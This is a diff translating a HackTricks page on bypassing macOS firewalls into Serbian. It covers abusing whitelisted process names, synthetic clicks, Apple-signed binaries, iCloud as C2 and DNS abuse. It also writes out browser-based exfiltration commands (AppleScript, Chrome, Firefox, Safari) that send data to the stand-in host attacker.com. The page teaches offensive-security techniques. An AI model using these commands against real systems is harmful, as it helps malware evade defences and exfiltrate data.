@@ -2,84 +2,74 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Found techniques
+## Pronađene tehnike
 
-The following techniques were found working in some macOS firewall apps.
+Sledeće tehnike su pronađene kao funkcionalne u nekim macOS firewall aplikacijama.
 
-### Abusing whitelist names
+### Zloupotreba imena na beloj listi
 
-- For example calling the malware with names of well known macOS processes like **`launchd`**
+- Na primer, pozivanje malvera sa imenima poznatih macOS procesa kao što je **`launchd`**
 
-### Synthetic Click
+### Sintetički Klik
 
-- If the firewall ask for permission to the user make the malware **click on allow**
+- Ako firewall traži dozvolu od korisnika, neka malver **klikne na dozvoli**
 
-### **Use Apple signed binaries**
+### **Koristite Apple potpisane binarne datoteke**
 
-- Like **`curl`**, but also others like **`whois`**
+- Kao **`curl`**, ali i druge kao što su **`whois`**
 
-### Well known apple domains
+### Poznate Apple domene
 
-The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.
+Firewall bi mogao dozvoliti veze sa poznatim Apple domenama kao što su **`apple.com`** ili **`icloud.com`**. I iCloud bi mogao biti korišćen kao C2.
 
-### Generic Bypass
+### Opšti Bypass
 
-Some ideas to try to bypass firewalls
+Neke ideje za pokušaj zaobilaženja firewalla
 
-### Check allowed traffic
+### Proverite dozvoljeni saobraćaj
 
-Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them
-
+Poznavanje dozvoljenog saobraćaja će vam pomoći da identifikujete potencijalno bele liste domene ili koje aplikacije imaju dozvolu za pristup njima
 ```bash
 lsof -i TCP -sTCP:ESTABLISHED
 ```
+### Zloupotreba DNS-a
 
-### Abusing DNS
-
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS rezolucije se vrše putem **`mdnsreponder`** potpisane aplikacije koja će verovatno biti dozvoljena da kontaktira DNS servere.
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
-### Via Browser apps
+### Putem aplikacija u pregledaču
 
 - **oascript**
-
 ```applescript
 tell application "Safari"
-    run
-    tell application "Finder" to set visible of process "Safari" to false
-    make new document
-    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
+run
+tell application "Finder" to set visible of process "Safari" to false
+make new document
+set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
 end tell
 ```
-
 - Google Chrome
-
 ```bash
 "Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Firefox
-
 ```bash
 firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
 ```
-
 - Safari
-
 ```bash
 open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
 ```
+### Putem injekcija procesa
 
-### Via processes injections
-
-If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:
+Ako možete **injektovati kod u proces** koji ima dozvolu da se poveže sa bilo kojim serverom, mogli biste zaobići zaštitu vatrozida:
 
 {{#ref}}
 macos-proces-abuse/
 {{#endref}}
 
-## References
+## Reference
 
 - [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
 
